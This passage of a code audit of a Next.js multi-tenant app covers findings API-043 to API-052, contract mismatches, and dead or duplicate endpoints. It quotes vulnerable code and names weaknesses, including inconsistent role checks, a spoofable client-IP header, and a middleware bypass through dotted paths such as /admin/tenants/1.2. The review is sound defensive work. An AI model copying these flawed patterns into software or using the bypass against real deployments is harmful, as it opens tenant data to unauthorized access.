  - authorization: `goals/[id]` PUT uses `normalizeRole(user.role)` (line 81) and DELETE compares the raw string `user.role !== 'Admin'` (line 156). `meetings/[id]` PUT allows any non-`Member` (line 86) while DELETE requires Admin/Manager/SuperAdmin (line 162).
- **Impact:** the same conceptual field is validated one way on create and another on update, and the same conceptual action is authorized one way for PUT and another for DELETE — the classic shape of a privilege bug that survives review because each line looks locally reasonable.
- **Fix:** one exported allowlist per enum field and one `requirePermission(...)` per operation, imported by both the create and the update handler of each resource.

---

### [API-043] `next lint` clean but `getPaginationParams` imported and unused in `governance/penalties` — Severity: Low

- **Location:** `app/api/governance/penalties/route.ts:8`
- **Evidence:**

```ts
import { getPaginationParams, formatPaginatedResponse } from '@/lib/utils/types';
```

Neither symbol is referenced anywhere in the file (lines 19-21 parse `page`/`limit` by hand and lines 83-88 build the `pagination` object inline). The intended bounded-pagination helper is imported and then dropped.
- **Impact:** the import documents an intent the code does not implement — a reviewer can see the safe pattern was available at the top of the file. It is also why API-026 exists here.
- **Fix:** use the helper (see API-026) or delete the import.

---

### [API-044] `/api/settings` caches a tenant-scoped-shaped response under a global key — Severity: Low

- **Location:** `app/api/settings/route.ts:10-12`, `:104-107`, `:124-127`, `:308`
- **Evidence:**

```ts
const SETTINGS_CACHE_KEY = 'settings:singleton';
const SETTINGS_CACHE_TTL = 5 * 60_000;
...
    const cached = settingsCache.get(SETTINGS_CACHE_KEY);
    if (cached && cached.expiresAt > Date.now()) { return NextResponse.json(cached.data); }
```

A module-level `Map` keyed on a single constant, holding the response for 5 minutes.
- **Impact:** currently consistent only because the underlying row is itself global (API-005). The moment `tenantId` scoping is added to satisfy API-005 without touching this cache, tenant A will be served tenant B's `companyName` and `shareValueBdt` for up to 5 minutes. On a multi-instance deployment the map is also per-process, so the cache is inconsistent by instance.
- **Fix:** key the cache by `tenantId` (or delete it and rely on the query), and note that in the same commit that adds tenant scoping.

---

### [API-045] `logAudit` swallows its own failure — Severity: Low

- **Location:** `lib/utils/audit.ts:31-33`
- **Evidence:**

```ts
  } catch (error) {
    console.error('Audit log failed:', error);
  }
```

Every caller `await`s `logAudit` and then returns success, so an audit-write failure (DB down, jsonb overflow in `details`) is invisible to the caller and the mutation proceeds unaudited.
- **Impact:** acceptable as a deliberate availability-over-audit choice, but it means "the action was audited" is never guaranteed, and the `/api/audit` view can silently have holes. Distinct from API-008, where the swallowed error *is* the operation being claimed as done.
- **Fix:** keep the non-throwing behaviour but increment a counter/emit a structured error so the gap is observable, and record `status: 'FAILURE'` rows for denied operations.

---

### [API-046] `login_attempts` and `sessions` grow without bound — Severity: Low

- **Location:** `app/api/auth/login/route.ts:18` (`MAX_LOGIN_HISTORY = 50`, never used); `app/api/auth/login-history/route.ts:8` (declared, used only as a `.limit()`); `app/api/auth/login/route.ts:248-263`
- **Evidence:** every login inserts a `login_attempts` row (164/179/194/208/222) and a `sessions` row (248) with no pruning anywhere in the codebase.
- **Impact:** unbounded growth of two tables that back the security UI, and the lockout query at `login/route.ts:127-136` scans them on every login attempt.
- **Fix:** delete `login_attempts` older than the lockout window and `sessions` older than the refresh lifetime on a schedule; use `MAX_LOGIN_HISTORY` for the retention it was named for.

---

### [API-047] `getClientIp` trusts a client-supplied header and the value is stored as evidence — Severity: Low

- **Location:** `app/api/auth/login/route.ts:96-100`, `:117-120`
- **Evidence:**

```ts
function getClientIp(request: NextRequest): string {
  return request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    request.headers.get('x-real-ip') || '0.0.0.0';
}
```

The result is written to `login_attempts.ip_address` and `sessions.ip_address` and displayed in `/api/auth/sessions` and `/api/auth/login-history` as the device's address. `location` is taken from the **request body** (line 117), so the geo shown alongside it is entirely client-supplied.
- **Impact:** the security panel's IP/location evidence is trivially forgeable, which undermines its value in exactly the incident it exists for. Standard practice (trust `x-forwarded-for` only from a known proxy and use the platform's `request.ip`) is not applied.
- **Fix:** derive the client IP from the platform (`request.ip` / a trusted-proxy allowlist) and derive geo server-side; label the client-provided values as untrusted if they must be kept.

---

### [API-048] `NextResponse.json` error paths return 500 for conditions that are 4xx — Severity: Low

- **Location:** `app/api/goals/route.ts:70`, `app/api/meetings/route.ts:85`, `app/api/governance/penalties/route.ts:94`, `app/api/expenses/route.ts:124`, and the same `err.statusCode || 500` idiom in 11 further handlers
- **Evidence:** `err.statusCode` is only set by the `AppError` classes in `lib/utils/errors.ts`. Every other error — a driver error, a `TypeError` from `body.title.trim()` on a non-string (`app/api/projects/[id]/route.ts:96`), an `Invalid Date` passed to `timestamptz` (`app/api/meetings/route.ts:114`) — falls through to 500 with the raw message.
- **Impact:** client-side retry logic cannot distinguish "your input was wrong" from "the server broke", and genuine 400-class input errors are reported as server faults.
- **Fix:** normalise at the boundary — map `AppError` to its own `statusCode` (already done correctly in `app/api/settings/route.ts:133-137` and the legacy `server/src/middleware/api.ts:76`) and return a fixed 500 body otherwise; add Zod parsing so malformed input never reaches the driver.

---

### [API-049] Dead `middleware.ts` path lists and an unused `pathname.includes('.')` escape hatch — Severity: Low

- **Location:** `lib/middleware/auth.ts:101-110`; `middleware.ts:16-25`, `:30-37`
- **Evidence:** `lib/middleware/auth.ts` declares `PUBLIC_PATHS` (101-104, login + refresh) and `ADMIN_PATHS` (107-110, `/api/admin` + `/api/settings`) — grep shows **neither identifier is referenced again in the file**. They document an intent that no code enforces; the real enforcement is `middleware.ts:16-25`, whose public list differs (it includes `/api/auth/forgot-password` and omits nothing else). And:

```ts
// middleware.ts:30-34
  if (
    pathname.startsWith('/_next') || pathname.startsWith('/static') ||
    pathname.startsWith('/favicon') || pathname.includes('.')
  ) {
    return NextResponse.next();
  }
```

Any path containing a dot skips **all** middleware logic — including the `/admin` platform gate at line 67 and the subscription fence at line 71. `/api/reports/generate/a.b` and `/admin/tenants/1.2` both take this path.
- **Impact:** a defence-in-depth layer that silently no-ops for a class of URLs, plus two constant lists that a reader could mistake for enforcement.
- **Fix:** delete the unused `PUBLIC_PATHS`/`ADMIN_PATHS` from `lib/middleware/auth.ts` (or call them), and narrow the dot check to the `/_next` and static-asset prefixes.

---

### [API-050] `POST /api/auth/register` and `PUT /api/members/[id]` do not validate email format — Severity: Low

- **Location:** `app/api/auth/register/route.ts:90-92`; versus `app/api/members/route.ts:56` and `app/api/members/[id]/route.ts:121`
- **Evidence:**

```ts
    if (!email) { throw new ValidationError('Email is required'); }
```

`members` validates with `EMAIL_RE.test(email)` at creation and on update; `register` only checks presence, so `normalizeEmail('not-an-email')` creates a user who can never receive mail and whose uniqueness is enforced against a malformed value.
- **Impact:** junk accounts, and a password-reset flow (once implemented, per API-039) that silently no-ops for them.
- **Fix:** reuse the `EMAIL_RE`/Zod email check; also add a length cap on `name` and `password` before `hashPassword`.

---

### [API-051] `hasSettingsWritePermission` is a third RBAC implementation — Severity: Low

- **Location:** `app/api/settings/route.ts:80-91`; versus `lib/permissions.ts:37-61` and `server/src/middleware/api.ts:26-61`
- **Evidence:**

```ts
function hasSettingsWritePermission(user: AuthenticatedUser): boolean {
  const role = normalizeRole(user.role);
  const userPermissions = user.permissions ?? {};
  if (role === 'SuperAdmin' || role === 'Admin') return true;
  const explicit = userPermissions?.['SETTINGS'];
  if (explicit === 'WRITE') return true;
  if (explicit === 'NONE') return false;
  return false; // Managers and below cannot write SETTINGS
}
```

The canonical evaluator is `hasScreenPermission(user, 'SETTINGS', 'WRITE')` (`lib/permissions.ts:37`), which also honours the `parentGrant` inheritance and the role baseline. This copy drops both.
- **Impact:** for `SETTINGS` the three happen to agree today, so there is no live bug — but a fourth divergent copy of an authorization rule is exactly how one becomes a bug later.
- **Fix:** delete the function and call `requirePermission('SETTINGS', 'WRITE')(user)`, which is what every other in-scope mutation does.

---

### [API-052] `POST /api/reports/export-generic` has no permission check and an unbounded payload — Severity: Low

- **Location:** `app/api/reports/export-generic/route.ts:28-38`; versus `server/src/modules/reports/routes.ts:8`
- **Evidence:**

```ts
    const { user, error } = await getAuthContext(request);
    ...
    const { title = 'export', data = [] } = body;
    if (!Array.isArray(data) || data.length === 0) {
      throw new ValidationError('A non-empty array of data is required for generic export');
    }
```

No `requirePermission('REPORTS', ...)` — the legacy equivalent has it. `data.length` has no upper bound, and `convertToCsv` (9-24) materialises the whole thing into one string.
- **Impact:** low data risk (it does not read the database — it re-serialises what the client sent), but it is a free CSV-generation primitive with the formula-injection exposure of API-030 and an unbounded memory cost. It is also dead: no UI caller.
- **Fix:** add `requirePermission('REPORTS','READ')`, cap `data.length`, and delete the endpoint (or wire it) — it duplicates what the client can do locally and it is the weaker of the two export paths.

---

## Contract mismatches (response shape / status codes)

Three response conventions coexist, and each is used by more than one route:

| Convention | Success shape | Routes |
| --- | --- | --- |
| `{success, data}` | wrapped | `POST /api/goals`, `GET /api/goals`, `GET|PUT /api/goals/[id]`, `GET|POST /api/meetings`, `GET|PUT /api/meetings/[id]`, `POST /api/meetings/[id]/attendance`, `GET|PUT|DELETE /api/projects/[id]`, `POST /api/projects/[id]/updates`, `GET|POST /api/members/[id]`, `GET|POST /api/governance/penalties`, `POST /api/governance/penalties/[id]/waive`, `GET /api/governance/rules` |
| bare (no `success`) | unwrapped | `GET /api/settings` (`:129`), `PUT /api/settings` (`:310`), `GET /api/settings/share-value-status` (`:48`), `GET /api/analytics/stats` (`:113`), `GET /api/analytics/analysis` (`:295`), `GET /api/auth/me` (`:68`), `GET /api/auth/users` (`:67` — a bare **array**), `GET /api/audit/metadata` (`:31`), `GET /api/audit/notifications` (`:65` — a bare **array**), `GET /api/members` (legacy, `:36`) |
| mixed | both | `POST /api/auth/login` (`:273`, bare user + tokens), `GET /api/auth/sessions` (`:50`, `{success,data:{sessions}}`), `GET /api/auth/login-history` (`:56`, `{success,data:{loginHistory}}`) |

Error shapes: `{success,message}` on the goals/meetings/projects/governance/reports/analytics/expenses handlers; `{success,message,code}` on the settings/audit/auth handlers; `{success,message,code}` from the legacy kernel — the only one that masks 5xx messages.

Status-code disagreements, both endpoints named:

| Condition | Endpoint A | Endpoint B |
| --- | --- | --- |
| Resource created | `POST /api/goals:118` → **201**; `POST /api/members:104` → 201; `POST /api/auth/register:157` → 201 | `POST /api/expenses:290` → **200** |
| Already in the target state | `POST /api/members:65` → `ConflictError` **409** | `POST /api/governance/penalties/[id]/waive:44` → `ValidationError` **400** |
| Permission denied | legacy `server/src/middleware/api.ts:144-149` → 403 + `code` | `app/api/members/route.ts:43-45` wraps the `ForbiddenError` in a bare `catch {}` and rethrows a hand-built one, dropping the original `code` |
| Missing/invalid id | `app/api/members/[id]:48` → 404 `NotFoundError` | `server/src/modules/members/handlers.ts:193-195` `assertUuid` → 400 `INVALID_ID` for a malformed id, 404 for a well-formed unknown one |
| DB duplicate from a race | `app/api/members/route.ts:65` intends 409 | the unique-violation path falls to `errJson` → **500** with the constraint name |

Pagination envelopes: `{data, meta{total,page,limit,pages,hasNext,hasPrev,from,to}}` (`/api/audit:110`, `/api/members` legacy) vs `{data, pagination{page,limit,total,totalPages}}` (`/api/meetings:74`, `/api/governance/penalties:83`, `/api/expenses:113`, `/api/transactions:126`).

---

## Duplicated or dead endpoints

**Client calls to routes that do not exist** (verified against the full 70-file route list): `POST /api/meetings/{id}/complete` (`app/meetings/page.tsx:97`), `POST /api/governance/performance/recalculate-all` (`app/governance/page.tsx:112`). Both 404 at runtime — see API-027.

**Routes in scope that no code in `app/`, `components/`, `hooks/` or `lib/` calls** (literal scan of every `/api/*` string):

| Route | Duplicate / note |
| --- | --- |
| `GET /api/audit/metadata` | duplicates the action/resource vocabulary a filter UI needs; never called |
| `GET /api/audit/notifications` | same data as `/api/audit`, different shape; never called |
| `POST /api/auth/logout-all` | a control with no UI and no enforcement (API-018) |
| `GET /api/auth/login-history` | correct and self-scoped, but unreachable from the product |
| `GET /api/auth/me` | duplicates the user object already returned by login and held in `lib/auth-context.tsx` |
| `PUT /api/auth/profile/password` | no UI entry point, so the "change password" flow does not exist |
| `GET /api/auth/sessions`, `DELETE /api/auth/sessions/[sessionId]` | the session-management UI does not exist; combined with API-018 this is a control with neither a surface nor an effect |
| `GET /api/auth/users` | no UI, and it is a cross-tenant dump (API-002) |
| `GET /api/governance/rules` | the UI uses the `DEFAULT_PENALTY_RULES` constant client-side (`db/schema/system_settings.ts`), so the server's configurable rules are never read — the governance config in `/api/settings` is write-only |
| `GET /api/settings/share-value-status` | duplicates `GET /api/settings`, which already returns `financial.shareValueBdt` and `financial.isShareValueLocked` (`:33-34`); both perform the same auto-lock write |
| `POST /api/reports/export-generic` | duplicates the legacy `POST /api/reports/export-generic`, which is guarded by `requirePermission('REPORTS','READ')` (`server/src/modules/reports/routes.ts:8`); the Next port dropped the guard (API-052) |

**Same resource, two implementations (the UI calls the first in each pair):**

| Live | Dead duplicate | Divergence |
| --- | --- | --- |
| `POST /api/expenses` (tenant-scoped, `hasScreenPermission`, ledger insert) | `POST /api/finance/expenses` → `handleAddExpense` (`app/api/finance/expenses/route.ts:6-8`; its `GET` is `methodNotAllowed()`) | two independent expense writers with different validation, tenant handling and audit payloads; both can touch the same fund balance |
| `GET /api/projects` → legacy kernel | `GET /api/projects/[id]` → Next-native | the list is unscoped and capped at 500 (`service.ts:30`); the detail is unscoped and uncapped |
| `GET /api/members` → legacy kernel | `GET /api/members/[id]` → Next-native | the list is tenant-scoped, paginated and redacted; the detail is unscoped when `tenantId` is null, unpaginated, and unredacted (API-021) |
| `GET /api/settings` | `GET /api/settings/share-value-status` | identical data, identical auto-lock side effect |
| `GET /api/audit` | `GET /api/audit/notifications` | same table, three response shapes across `/api/audit` |

**Duplicated helpers (maintenance risk, each a divergence point):** `ALL_SCREENS` + `getDefaultPermissions` in five files (`lib/middleware/auth.ts:80-98`, `app/api/auth/login/route.ts:34-48`, `app/api/auth/register/route.ts:26-41`, `app/api/admin/tenants/onboard/route.ts:13,60`, `server/src/modules/auth/service.ts:80-92`); `toUserResponse` in four files (`login:50`, `register:43`, `me:23`, `users:23`); `convertToCsv` in two (`reports/generate/[type]:20`, `reports/export-generic:9`); `getPaginationParams`/`formatPaginatedResponse` in two (`lib/utils/types.ts:23,33` and `server/src/middleware/api.ts:200,215`); the entire `hasScreenPermission` evaluator in two (`lib/permissions.ts:37` and `server/src/middleware/api.ts:26`).

**`NEXT_PUBLIC` base mismatch:** none. `lib/api-client.ts:25` builds every URL as `/api${endpoint}` with no `NEXT_PUBLIC_API_URL` in play, and the `app/`, `components/` and `hooks/` call sites all pass root-relative paths (`"/goals"`, `"/members/${id}"`) — consistent. The real client-side gap is the missing abort signal/timeout (`api-client.ts:50`, `:90`), which means a hung request never settles its React Query mutation.

---

## What is done right (short)

- **Next 15 dynamic-API conventions are correct throughout.** Every dynamic route takes `{ params }: { params: Promise<{ id: string }> }` and awaits it (`app/api/goals/[id]/route.ts:20`, `members/[id]:39`, `meetings/[id]:20`, `attendance:24`, `projects/[id]:20`, `updates:24`, `governance/penalties/[id]/waive:25`), and no handler calls `request.json()` twice. `cookies()` is awaited in the legacy session helper (`server/src/lib/session.ts:37`). No route exports a stale `revalidate`, and `export const dynamic = 'force-dynamic'` on the legacy-kernel routes (`members/route.ts:13`, `projects/route.ts:4`) is correct-and-harmless rather than load-bearing, since Next 15 does not cache route handlers by default.
- **No SQL injection anywhere in scope.** Every value reaches the driver through a drizzle placeholder or an `sql` template with a bound parameter — including the free-text `ILIKE` searches (`goals/route.ts:36`, `meetings/route.ts:35`, `expenses/route.ts:69`, `audit/route.ts:74`) and the hand-built `sql` fragments in the penalty and attendance counters (`penalties/route.ts:170`, `attendance/route.ts:84`). Where a `sortBy` is honoured, it is mapped through an allowlist rather than interpolated (`server/src/modules/members/service.ts:9-17,70`).
- **The waive endpoint is the one genuinely idempotent mutation**: `app/api/governance/penalties/[id]/waive/route.ts:43-45` rejects a second waive before mutating anything.
- **`POST /api/expenses` is the best-validated handler in scope** — positive amount, a real 2-decimal-place regex (`:168`), fund existence + `ACTIVE` status + a minimum-balance reserve check (`:201-214`), project existence, the whole thing inside `db.transaction` (`:233`), plus `logAudit` (`:272`).
- **Auth cookies are properly hardened**: `httpOnly`, `secure` in production, `sameSite: 'strict'` in production, refresh scoped to `path: '/api/auth'` (`lib/utils/cookies.ts:17-33`).
- **JWT errors are normalised before they reach the client** (`lib/utils/jwt.ts:83-91`), and the refresh secret is derived separately from `JWT_SECRET` (`:30-41`).
- **Login lockout exists at all**, is recorded per attempt with IP/UA/location, and returns `423` via `LockedError` (`app/api/auth/login/route.ts:138-150`, `lib/utils/errors.ts:48-53`).
- **The legacy kernel is a well-designed reference**: fail-closed `requireTenant` (`server/src/middleware/api.ts:244-252`), a real Zod query schema with bounded `limit` (`handlers.ts:17-27`), a `SORTABLE_COLUMNS` allowlist, `assertUuid` on path params, `COUNT(*) OVER()` for an accurate total (`service.ts:76`), and a 5xx-masking error mapper (`api.ts:76`). Where the Next-native handlers fall short, this file shows the intended pattern.
- **`logAudit` is awaited on nearly every mutation in scope** and its own failure does not break the request (`lib/utils/audit.ts:31-33`) — a deliberate and reasonable trade-off (see API-045 for the caveat).
- **`app/api/expenses` and `app/api/settings` are the two handlers that do everything right on validation**: `.safeParse()` with a checked result, a 400 with `fieldErrors`, and Zod's default key-stripping preventing mass assignment of `tenantId`/`id` (`settings/route.ts:165-178`).
